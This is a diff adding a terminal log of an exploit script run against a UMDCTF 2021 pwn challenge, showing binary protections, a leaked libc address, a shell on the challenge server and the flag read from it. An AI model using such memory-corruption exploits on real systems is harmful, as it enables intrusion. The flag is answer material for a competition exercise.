@@ -1,0 +1,30 @@
+mito@ubuntu:~/CTF/UMDCTF_2021/Pwn_Jump_Not_Working_150$ python solve.py r
+[*] '/home/mito/CTF/UMDCTF_2021/Pwn_Jump_Not_Working_150/JNW'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to chals5.umdctf.io on port 7004: Done
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+puts_addr = 0x7fc4936f3aa0
+libc_base = 0x7fc493673000
+[*] Switching to interactive mode
+$ id
+/bin/sh: 1: id: not found
+$ ls -l
+total 44
+-rwxr-x--- 1 0 1000 16968 Apr 13 00:59 JNW
+drwxr-x--- 1 0 1000  4096 Apr 13 01:02 bin
+drwxr-x--- 1 0 1000  4096 Apr 13 01:01 dev
+-rwxr----- 1 0 1000    28 Apr 13 00:59 flag
+drwxr-x--- 1 0 1000  4096 Apr 13 01:01 lib
+drwxr-x--- 1 0 1000  4096 Apr 13 01:01 lib32
+drwxr-x--- 1 0 1000  4096 Apr 13 01:01 lib64
+$ cat flag
+UMDCTF-{JuMp_1s_N0w_w0RK1nG}s
